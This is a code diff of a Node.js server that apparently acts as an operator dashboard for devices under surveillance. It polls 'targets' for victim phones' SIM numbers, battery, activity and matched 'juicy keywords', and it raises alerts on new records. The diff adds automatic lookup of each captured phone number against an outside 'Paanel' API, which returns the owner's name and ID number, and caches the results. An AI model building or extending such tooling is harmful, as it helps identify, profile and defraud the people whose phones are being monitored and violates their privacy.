@@ -800,6 +800,33 @@ async function pollTarget(target) {
                 || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);
       }
 
+      // ── Enrich SIM numbers with Paanel data (non-blocking) ──────────────────
+      let sim1_enriched = [];
+      let sim2_enriched = [];
+      
+      // Only enrich if we have valid SIM numbers
+      const sim1Clean = s1 ? String(s1).replace(/\D/g,'').slice(-10) : '';
+      const sim2Clean = s2 ? String(s2).replace(/\D/g,'').slice(-10) : '';
+      
+      // Check cache first, enrich asynchronously if not cached
+      if (sim1Clean && sim1Clean.length === 10) {
+        if (paanelCache[sim1Clean]) {
+          sim1_enriched = paanelCache[sim1Clean];
+        } else {
+          // Enrich asynchronously (don't block polling)
+          enrichSimNumber(sim1Clean).catch(() => {});
+        }
+      }
+      
+      if (sim2Clean && sim2Clean.length === 10) {
+        if (paanelCache[sim2Clean]) {
+          sim2_enriched = paanelCache[sim2Clean];
+        } else {
+          // Enrich asynchronously (don't block polling)
+          enrichSimNumber(sim2Clean).catch(() => {});
+        }
+      }
+
       const oldRecord = getTargetDb(target)[actualDid] || null;
       upsertDevice(target, actualDid, {
         brand, last_battery: bat, sim1_number: s1, sim2_number: s2,
@@ -807,7 +834,7 @@ async function pollTarget(target) {
         last_activity: actStr !== 'Unknown' ? actStr : null,
         juicy_keywords: foundKws,
         app_id: appId, obj_id: objId, user_serial: userSerial,
-        sim1_enriched: [], sim2_enriched: [],
+        sim1_enriched, sim2_enriched,
       });
       const newRecord = getTargetDb(target)[actualDid];
       dispatchAlerts(target, actualDid, oldRecord, newRecord);
@@ -1501,28 +1528,42 @@ app.get('/api/names/:urlId', (req, res) => {
 });
 
 // ── Paanel Cache: fetch NAME and ID from Paanel API with caching ─────────────
+// Cache structure: { "10digit": [{ name, id }, ...] }
+let paanelCache = {};
+
 function loadPaanelCache() {
-  try { if (fs.existsSync(PAANEL_CACHE_FILE)) return JSON.parse(fs.readFileSync(PAANEL_CACHE_FILE, 'utf8')); }
-  catch {}
-  return {};
-}
-function savePaanelCache(cache) {
-  try { fs.writeFileSync(PAANEL_CACHE_FILE, JSON.stringify(cache, null, 2)); }
-  catch (e) { console.error('Paanel cache save error:', e.message); }
+  try { 
+    if (fs.existsSync(PAANEL_CACHE_FILE)) {
+      paanelCache = JSON.parse(fs.readFileSync(PAANEL_CACHE_FILE, 'utf8'));
+      console.log(`[Paanel] Loaded cache with ${Object.keys(paanelCache).length} entries`);
+    }
+  }
+  catch (e) {
+    console.error('[Paanel] Cache load error:', e.message);
+  }
+  return paanelCache;
 }
 
-// GET /api/paanel/:number - fetch Paanel data for a 10-digit number (with caching)
-app.get('/api/paanel/:number', async (req, res) => {
-  const number = req.params.number.replace(/\D/g,'').slice(-10);
+function savePaanelCache() {
+  try { 
+    fs.writeFileSync(PAANEL_CACHE_FILE, JSON.stringify(paanelCache, null, 2));
+  }
+  catch (e) { 
+    console.error('[Paanel] Cache save error:', e.message);
+  }
+}
+
+// Enrich a single SIM number with Paanel data (used during Firebase polling)
+async function enrichSimNumber(simNumber) {
+  // Extract 10-digit number
+  const number = String(simNumber || '').replace(/\D/g,'').slice(-10);
   if (!number || number.length !== 10) {
-    return res.status(400).json({ error: 'Invalid number - must be 10 digits' });
+    return [];
   }
 
-  const cache = loadPaanelCache();
-  
   // Return cached data if available
-  if (cache[number]) {
-    return res.json({ cached: true, ...cache[number] });
+  if (paanelCache[number]) {
+    return paanelCache[number];
   }
 
   // Fetch from Paanel API
@@ -1534,36 +1575,56 @@ app.get('/api/paanel/:number', async (req, res) => {
     });
     
     if (!response.ok) {
-      throw new Error(`HTTP ${response.status}`);
+      console.error(`[Paanel] API error for ${number}: HTTP ${response.status}`);
+      // Cache empty array to prevent repeated failed requests
+      paanelCache[number] = [];
+      savePaanelCache();
+      return [];
     }
     
     const data = await response.json();
     
-    // Extract first result's NAME and id (12-digit)
+    // Store all records as array
     if (data && Array.isArray(data) && data.length > 0) {
-      const first = data[0];
-      const result = {
-        name: first.NAME || '',
-        id: first.id || '',
-        cached: false
-      };
+      const records = data.map(record => ({
+        name: record.NAME || '',
+        id: record.id || ''
+      })).filter(r => r.name || r.id); // Only keep records with data
       
-      // Cache the result
-      cache[number] = result;
-      savePaanelCache(cache);
-      
-      return res.json(result);
+      paanelCache[number] = records;
+      savePaanelCache();
+      console.log(`[Paanel] Enriched ${number}: ${records.length} record(s)`);
+      return records;
     }
     
-    // No data found
-    const emptyResult = { name: '', id: '', cached: false };
-    cache[number] = emptyResult;
-    savePaanelCache(cache);
-    return res.json(emptyResult);
+    // No data found - cache empty array
+    paanelCache[number] = [];
+    savePaanelCache();
+    console.log(`[Paanel] No data for ${number}`);
+    return [];
     
   } catch (error) {
-    return res.status(500).json({ error: error.message });
+    console.error(`[Paanel] Request failed for ${number}:`, error.message);
+    // Cache empty array on error to prevent repeated failures
+    paanelCache[number] = [];
+    savePaanelCache();
+    return [];
   }
+}
+
+// GET /api/paanel/:number - fetch Paanel data for a 10-digit number (with caching)
+app.get('/api/paanel/:number', async (req, res) => {
+  const number = req.params.number.replace(/\D/g,'').slice(-10);
+  if (!number || number.length !== 10) {
+    return res.status(400).json({ error: 'Invalid number - must be 10 digits' });
+  }
+
+  const records = await enrichSimNumber(number);
+  res.json({ 
+    number,
+    records,
+    cached: paanelCache[number] !== undefined
+  });
 });
 
 // ── Keywords: get/update the juicy keywords list ──────────────────────────────
@@ -1980,6 +2041,7 @@ app.get('*', (_, res) => res.sendFile(path.join(__dirname, 'public', 'index.html
 
 // ── Boot ──────────────────────────────────────────────────────────────────────
 loadDashboardDb();
+loadPaanelCache();
 loadAlertStore();
 // Sync subscribers for all bots at startup
 syncAllBotSubscribers();
